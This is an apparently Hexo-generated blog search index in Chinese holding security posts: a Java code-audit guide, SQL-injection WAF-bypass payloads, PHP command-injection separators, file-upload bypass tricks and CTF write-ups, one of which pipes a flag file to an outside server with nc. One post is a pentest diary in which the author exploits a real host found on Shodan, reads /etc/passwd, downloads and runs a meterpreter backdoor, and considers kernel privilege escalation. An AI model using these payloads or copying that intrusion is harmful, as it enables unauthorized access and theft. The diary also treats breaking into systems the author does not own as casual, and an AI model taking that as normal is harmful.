<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>从1开始的Java代码审计·第一弹·基础篇</title>
      <link href="/2018/10/25/java-audit-step-by-step-1/"/>
      <url>/2018/10/25/java-audit-step-by-step-1/</url>
      
        <content type="html"><![CDATA[<h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p><a id="more"></a><p><img src="/2018/10/25/java-audit-step-by-step-1/jdk_ctl.png" alt="jdk-ctl"></p><h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><p>做任何一门语言的代码审计，一个强大的IDE是必不可少的，好的IDE可以极大提高我们审计的效率。写Java的程序及代码审计，我推荐使用JetBrains家的<a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener"><code>Intelij IDEA</code></a>（JB大法好 O(∩_∩)O ），内置的代码检查工具比Eclipse强太多了，而且有很多的插件支持。</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>常见的数据库有 MySQL、PostgreSQL、Oracle，除此之外还有现在比较流行的非关系型数据库 Redis、Mongodb、Memcached 等等，有些数据库安装起来可能比较麻烦，不用一次性装完，有需要的时候再去装就行了。</p><h2 id="Web-容器"><a href="#Web-容器" class="headerlink" title="Web 容器"></a>Web 容器</h2><p><code>Java Web</code>应用在开发完后，通常会以<code>war</code>包的形式发布，我们需要把这个<code>war</code>包部署到自己的<code>Web容器</code>（也可以说是Web服务器）里去，容器在启动后会自动解压<code>war</code>包，处理用户发来的HTTP请求，将<code>jsp</code>编译成<code>servlet</code>，管理<code>servlet</code>的整个生命周期。</p><p>常见的 Web 容器有 Tomcat，JBoss，Jetty，Weblogic，不同的容器在功能、性能上有所差异，但仅仅是做代码审计用<a href="http://tomcat.apache.org/" target="_blank" rel="noopener"><code>Tomcat</code></a>就足够了。</p><hr><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><h2 id="依赖检查"><a href="#依赖检查" class="headerlink" title="依赖检查"></a>依赖检查</h2><p>一个完整的Java项目，必然会引入一些外部的第三方库。这些库如果出了安全漏洞，会给应用带来巨大的风险。比如经常爆洞的<code>struts2</code>，以及最近几年很火的Java反序列化漏洞相关的<code>fastjson</code>,<code>jackson</code>,<code>apache-commons-collections</code>等等。如果开发者在开发的时候，没有对引入的库做安全检查，或者是直接从代码库里拉出来的依赖配置，那么很可能会引入过时了很久的库版本，带来安全隐患。在 OWASP TOP10 中有讲到这一类型的安全风险。</p><blockquote><p>参考 <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank" rel="noopener"><code>OWASP TOP10 A9</code></a></p></blockquote><p>推荐一个工具，OWASP 出的 <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a>，可以自动帮我们检查，引入的第三方库是否有已知的安全漏洞。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="插件模式"><a href="#插件模式" class="headerlink" title="插件模式"></a>插件模式</h4><p>作为 maven 的插件使用，用法很简单，直接在项目的 <code>pom.xml</code> 写入</p><pre><code><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>然后，执行 `mvn verify` 就可以了。</code></pre><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><p>我更喜欢以独立的命令行模式来运行，这样就不用进IDE额外修改 <code>pom.xml</code> 配置了。</p><ol><li><p>进入项目的github，<a href="https://github.com/jeremylong/DependencyCheck/releases" target="_blank" rel="noopener"><code>DependencyCheck</code></a>，找到最新的那版，下载下来。</p></li><li><p>解压出来，进到bin目录，有两个文件，分别对应windows版和linux版。</p></li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/bin_directory.png" alt="bin目录"></p><ol start="3"><li>进到命令行下，执行 <code>dependency-check.bat --project 项目名 --out 输出名 -s 源码路径</code> 即可，程序会自动从NVD更新漏洞库，所以需要点时间（应该还要翻墙）。</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_dc.png" alt="执行过程"></p><ol start="4"><li>扫描完毕后，会输出一份报告，如下：</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/result_dc.png" alt="扫描结果"></p><h2 id="FindSecBugs"><a href="#FindSecBugs" class="headerlink" title="FindSecBugs"></a>FindSecBugs</h2><p><a href="https://find-sec-bugs.github.io" target="_blank" rel="noopener">FindSecBugs</a> 是专门用于检测Java Web应用安全漏洞的插件，支持多种IDE，还可以和SonarQube等代码分析平台集成。</p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>安装方法官网讲的很详细了，<a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial" target="_blank" rel="noopener">IDEA中安装FindSecBugs</a>。</p><p>这里主要讲IDEA中如何使用<code>FindSecBugs</code>。</p><p>IDEA打开要审计的项目以后，先点开 FindBugs-IDEA 标签，然后点左边的这个带绿色旗帜的文件夹logo，插件就会自动对项目进行审计。</p><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_fsb.png" alt="开始扫描"></p><p><img src="/2018/10/25/java-audit-step-by-step-1/result_fsb.png" alt="扫描结果"></p><p>看这个项目的扫描结果，发现了 5 处安全bug，其中四处是文件的操作可能被用户控制，造成任意文件删除。当然，这也可能是误报，需要人工来再次确认。不过，这已经给我们的审计工作带来了很大的便利了（。＾▽＾）。</p><h2 id="抓包改包"><a href="#抓包改包" class="headerlink" title="抓包改包"></a>抓包改包</h2><p>做Java Web审计时，可能要结合黑盒的方法，动态调试。这时候就需要抓包改包的工具，发送自定义的HTTP包。这个功能很多工具都有，burpsuite，zap，postman，fiddler都可以用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从1开始的Java代码审计·序</title>
      <link href="/2018/10/25/java-audit-step-by-step-0/"/>
      <url>/2018/10/25/java-audit-step-by-step-0/</url>
      
        <content type="html"><![CDATA[<p>小组经常有小伙伴问我<code>Java</code>该怎么审计，其实我也挺头大的。因为，在我看来审<code>Java</code>的代码，和审<code>PHP</code>的代码，相差不大。WEB 漏洞就那些，只是换了门语言实现而已，只要漏洞原理知道了，审起来是很容易的。</p><p>很多学安全的同学，应该是从<code>PHP</code>入门的。<code>PHP</code>作为一门脚本语言，跨平台、语法简单、易上手、开源框架多、用户量大。但是，<code>PHP</code>语言本身的特性，它在后期的拓展和维护困难，而且支持所有漏洞（抖个机灵）。很多对系统稳定性、安全性要求较高的厂商不太会去选择<code>PHP</code>，而是<code>Java</code>或者别的语言。</p><p><code>Java</code>是纯正的面向对象的语言，适合团队协作开发，重构、维护相对轻松，语言生态好，且在高性能、高并发、分布式的场景吊打某语言。（虽然<code>PHP</code>也是支持面向对象的写法，不过身边真的在用面向对象的方法写<code>PHP</code>的同学真的很少，可能是不太理解面向对象的概念，也可能是因为写起来代码太长了？）</p><p>目前，网上关于 WEB 代码审计的文章很多都是<code>PHP</code>的，和<code>Java</code>相关的很少，而且质量一般。所以我打算做一个<code>Java</code>代码审计的系列，分享<code>Java</code>代码审计相关的小姿势。</p><p>在这个系列里，我假设每个读者都对 Java 和 WEB 安全方面的知识都有一定的了解，所以可能不会对漏洞的原理做很深的分析。</p><p>如果你觉得看起来有些累，或者对某个漏洞不理解，建议先去找些相关资料学习下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透日记-20181005</title>
      <link href="/2018/10/05/pentest-20181005/"/>
      <url>/2018/10/05/pentest-20181005/</url>
      
        <content type="html"><![CDATA[<p>在 shodan 上搜到一个有趣的站，名字就叫 webshell。</p><p><img src="/2018/10/05/pentest-20181005/1.png" alt="1"></p><p>根据提示</p><blockquote><p>Nothing specify params. Try to use “?file=” or “?id=time” to read a stream.</p></blockquote><p>可以通过 file 参数读取文件内容。</p><p>尝试读取 /etc/passwd 成功。</p><a id="more"></a><p><img src="/2018/10/05/pentest-20181005/2.png" alt="2"></p><p>尝试执行命令，<code>a;ls</code>，成功。</p><p><img src="/2018/10/05/pentest-20181005/3.png" alt="3"></p><p>但是但我尝试读取上级目录的时候，<code>a;ls ..</code>，失败。</p><p><img src="/2018/10/05/pentest-20181005/4.png" alt="4"></p><p>尝试了很多方法，最后发现，可能是空格失效了。</p><p>找到 l3m0n 师傅的命令执行绕过技巧，尝试 <code>&lt;&gt;</code> <code>${IFS}</code> 替代空格。</p><p>执行成功。</p><p><img src="/2018/10/05/pentest-20181005/5.png" alt="5"></p><p>接下来，就可以弹一个shell回来，然后为所欲为啦。 （。＾▽＾）</p><p>不过我喜欢用 msf ，那就先在自己服务器的 web 目录写一个 meterpreter 的后门。</p><p>再 wget 下来后运行。</p><p><img src="/2018/10/05/pentest-20181005/6.png" alt="6"></p><p><img src="/2018/10/05/pentest-20181005/7.png" alt="7"></p><p>成功连上。</p><p><img src="/2018/10/05/pentest-20181005/8.png" alt="8"></p><p>Ubuntu 16.04 内核 <code>4.4.0-77</code>，<code>CVE-2017-16995</code> 应该可以直接提权，不过是国内的机器，也没什么太多有意思的东西，就不深入了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>当SQL注入遇到WAF</title>
      <link href="/2018/09/19/summary-sqli-bypass/"/>
      <url>/2018/09/19/summary-sqli-bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前，有越来越多的网站上了 WAF ，有硬WAF，软WAF，云WAF，内嵌WAF。给SQL注入的利用带来不小麻烦，下面总结些常见的 WAF Bypass 姿势。</p><hr><h2 id="Bypass-姿势"><a href="#Bypass-姿势" class="headerlink" title="Bypass 姿势"></a>Bypass 姿势</h2><h3 id="大小写混合"><a href="#大小写混合" class="headerlink" title="大小写混合"></a>大小写混合</h3><p>在规则匹配时，只过滤了特定的大写或小写，可以通过混合大小写的方式绕过。（目前很少有这种情况出现）</p><blockquote><p>UniON SelEcT 1,2,3</p></blockquote><a id="more"></a><h3 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h3><ol><li><p>有些 WAF 不会对普通字符进行 URL编码，可以对 payload 进行 URL 编码来绕过。</p><blockquote><p>%55%6e%49%6f%6e%20%53%65%4c%65%43%74%20%31%2c%32%2c%33%2c%34 – UnIon SeLeCt 1,2,3,4</p></blockquote></li><li><p>还有些 WAF 可能只进行了一次解码，如果 Web 程序中有对参数进行了一次解码，那么还是可以绕过。</p><p> 如下图：</p><p> <img src="/2018/09/19/summary-sqli-bypass/double-encode.png" alt="double-encode"></p></li></ol><h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>WAF 通过替换或删除 <code>select</code> <code>union</code> 等关键词来过滤，且只过滤了一次的情况时，可以双写关键字来绕过。</p><blockquote><p>UniUnioNon SeSelecTlect 1,2,3,4</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>WAF 在过滤空格时，可以用注释来替代。</p><blockquote><p>union/*1*/select/*1*/1,2,3,4</p></blockquote><h3 id="多参数请求拆分"><a href="#多参数请求拆分" class="headerlink" title="多参数请求拆分"></a>多参数请求拆分</h3><p>如果多个参数会拼接到同一条 SQL 语句中，可以将注入的语句拆分插入。</p><p>如发出请求 ：</p><blockquote><p>a=[data1]&amp;b=[data2]</p></blockquote><p>拼接到 SQL 语句中，变成 ：</p><blockquote><p>and a=[data1] and b=[data2]</p></blockquote><p>那么，可以构造 payload ：</p><blockquote><p>a=unIOn/<em>&amp;b=</em>/Select 1,2,3,4</p></blockquote><p>SQL 语句就变成 ：</p><blockquote><p>and a=unIOn/<em> and b=</em>/Select 1,2,3,4</p></blockquote><h3 id="HTTP-参数污染"><a href="#HTTP-参数污染" class="headerlink" title="HTTP 参数污染"></a>HTTP 参数污染</h3><p>当同一参数出现多次时，不同的中间件会解析出不同的结果。</p><p>在 <code>ASP / IIS</code> ， <code>ASP.NET / IIS</code> 下，多个同一参数会被逗号 <code>,</code> 给拼接起来。</p><p>如 ：</p><blockquote><p>?inject=select&amp;inject=1&amp;inject=2&amp;inject=3&amp;inject=4</p></blockquote><p>如果 WAF 只检测同参数名中第一个或最后一个，由于 <code>IIS</code> 的特性则可以成功绕过 WAF。</p><h3 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h3><p>WAF 使用黑名单机制，过滤某些函数，如报错注入时使用的 <code>updatexml()</code> 函数，可以用 <code>polygon()</code> 替代。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>空格绕过:  <code>/*1*/</code> <code>()</code> <code>tab</code> <code>/**/</code> <code>%0a</code> <code>%20</code> <code>%09</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>%a0</code> <code>%00</code></p><p>引号绕过： 使用十六进制，将查询的参数使用十六进制替换。</p><p>注释符绕过：</p><p>逗号绕过：</p><ol><li><p><code>from to</code></p><p> select substr(database() from 1 to for)</p></li><li><p>join</p><p> union select 1,2</p><p> #等价于</p><p> union select * from (select 1)a join (select 2)b</p></li><li><p>like</p><p> select ascii(mid(user(),1,1))=80</p><p> #等价于</p><p> select user() like ‘r%’</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">等价函数</span><br><span class="line"></span><br><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>《Web安全攻防》</p><p><a href="http://www.mamicode.com/info-detail-2361120.html" target="_blank" rel="noopener">SQL注入防御绕过——二次编码之干掉反斜杠</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP中的命令执行</title>
      <link href="/2018/09/18/summary-command-execution/"/>
      <url>/2018/09/18/summary-command-execution/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 PHP 中, <code>exec()</code>、<code>system()</code>、<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code>，还有反引号 ``包裹的内容，都可以用来执行系统命令。</p><p>如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。</p><p>下面是常见的函数描述：</p><ul><li><p>system()</p><p>  输出并返回最后一行shell结果。 </p></li><li><p>exec()</p><p>  不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p></li><li><p>passthru()</p><p>  只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p></li><li><p>popen()、proc_open()</p><p>  不会直接返回执行结果，而是返回一个文件指针。</p></li><li><p>反引号</p><p>  调用 <code>shell_exec()</code> 函数</p></li></ul><a id="more"></a><hr><h2 id="各平台的漏洞利用"><a href="#各平台的漏洞利用" class="headerlink" title="各平台的漏洞利用"></a>各平台的漏洞利用</h2><p>在实际场景中，要利用命令执行漏洞，通常需要借助管道符，拼接到正常的命令参数中来实现。</p><p>各个平台支持的管道符都有所不同，下面是 <code>Windows</code> 及 <code>Linux</code> 支持的管道符。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><p>\;</p><p>  执行完前面的语句，再执行后面的。</p><blockquote><p>ping 127.0.0.1;whoami</p></blockquote></li><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><hr><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>PHP 内置了两个函数，<code>escapeshellarg()</code>，<code>escapeshellcmd()</code>可以防止命令执行。</p><ol><li><p>escapeshellarg()</p><p> 把字符串转码为可以在 shell 命令里使用的参数。</p></li><li><p>escapeshellcmd()</p><p> shell 元字符转义。</p><p> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <code>exec()</code> 或 <code>system()</code> 函数，或者 执行操作符 之前进行转义。</p><p> 反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传绕过的各种姿势</title>
      <link href="/2018/09/18/summary-fileupload-bypass/"/>
      <url>/2018/09/18/summary-fileupload-bypass/</url>
      
        <content type="html"><![CDATA[<ol><li><p>JS前端检测</p><ul><li><p>浏览器审核元素，修改代码</p></li><li><p>BP抓包，修改后缀</p></li></ul></li><li><p>文件后缀绕过</p><p> Apache 的配置文件 <code>httpd.conf</code>,配置了哪些后缀会当作 <code>php</code> 脚本来解析，只要上传支持的后缀就行。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="3"><li><p>Content-Type 绕过</p><p> 如果后台是通过 <code>Content-Type</code> 判断文件类型的，可以通过抓包修改 <code>Content-Type</code> 绕过，如 <code>image/jpeg</code>,<code>image/gif</code>。</p></li><li><p>getimagesize() 绕过</p><p> PHP函数 <code>getimagesize()</code> 可以获取图片信息，以此来判断是不是图片。</p><p> 可以将图片和 <code>webshell</code> 合并绕过。</p><blockquote><p>copy img.jpg /a + webshell.php /b &gt; webhsell.php </p></blockquote></li><li><p>文件截断绕过</p><p> 参数值中包含 <code>%00</code>，字符串后面的内容会被截断。</p><p> 如参数 <code>a=1.php%00.jpg</code>，截断后就变为 <code>a=1.php</code>。</p><p> 此方法在 <code>PHP 5.3.4</code> ，且关闭了 <code>GPC</code> 的情况下有效。</p></li><li><p>条件竞争</p><p> 有些程序在上传时，会先将文件上传到服务器，再判断文件是否是 <code>webshell</code>，如果是 <code>webshell</code> 再删除。</p><p> 这个过程是需要时间的，如果在文件被删除前访问 <code>webshell</code>，再写一个 <code>webshell</code>，就可以绕过该限制。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-BLOG</title>
      <link href="/2018/09/11/ichunqiu-web-BLOG/"/>
      <url>/2018/09/11/ichunqiu-web-BLOG/</url>
      
        <content type="html"><![CDATA[<p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p><a id="more"></a><p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p><p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p><p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p><p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p><p>Payload:</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p></blockquote><p>根据回显，得出第二个字段是标题，第三个字段是内容。</p><p>开始爆数据：</p><ul><li><p>爆表名</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p></blockquote></li><li><p>爆字段</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p></blockquote></li><li><p>爆用户</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p></blockquote></li><li><p>爆密码</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p></blockquote></li></ul><p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p><p>测试后，发现确实是这个问题。</p><p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-EXEC</title>
      <link href="/2018/09/11/ichunqiu-web-EXEC/"/>
      <url>/2018/09/11/ichunqiu-web-EXEC/</url>
      
        <content type="html"><![CDATA[<p>根据提示，是一道命令执行的题。</p><p>打开以后，提示 <code>no sign</code> ，未登录。</p><p>查看源码，看到 <code>meta</code> 信息里有提示，使用了 <code>vim</code>。猜测可能存在 <code>swp</code> 文件泄露。</p><p>直接访问 <code>.index.php.swp</code> ，成功下载。</p><p>使用命令 <code>vim -r .index.php.swp</code> ，恢复文件，获得以下内容。</p><p>整理内容，得到以下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">        setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                $command=$_POST[cmd];</span><br></pre></td></tr></table></figure><p>分析代码，知道需要通过 <code>GET</code> 传入一个 <code>sign</code>参数 ，必须和 <code>11259375</code> 相等，同时参数的每个字符都不能在 <code>1-9</code>之间。</p><p>这里用的是 <code>==</code> ，所以可以传入 <code>0xabcdef</code> 绕过。</p><p>通过外层 <code>if</code> 后，提示 <code>tcp 通道不能使用</code>，然后会执行 <code>cmd</code> 参数的命令。</p><p>这里需要一台服务器监听一个 <code>udp</code> 端口，可以用 <code>nc</code> 实现，</p><blockquote><p>nc -ul 8989</p></blockquote><p><img src="/2018/09/11/ichunqiu-web-EXEC/bp.png" alt="bp"></p><p>传入 <code>cmd=nc -u 服务器地址 端口 &lt; flag233.php</code>，服务器就能接收到 <code>flag233.php</code> 的内容。</p><p><img src="/2018/09/11/ichunqiu-web-EXEC/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-SQLi</title>
      <link href="/2018/09/10/ichunqiu-web-SQLi/"/>
      <url>/2018/09/10/ichunqiu-web-SQLi/</url>
      
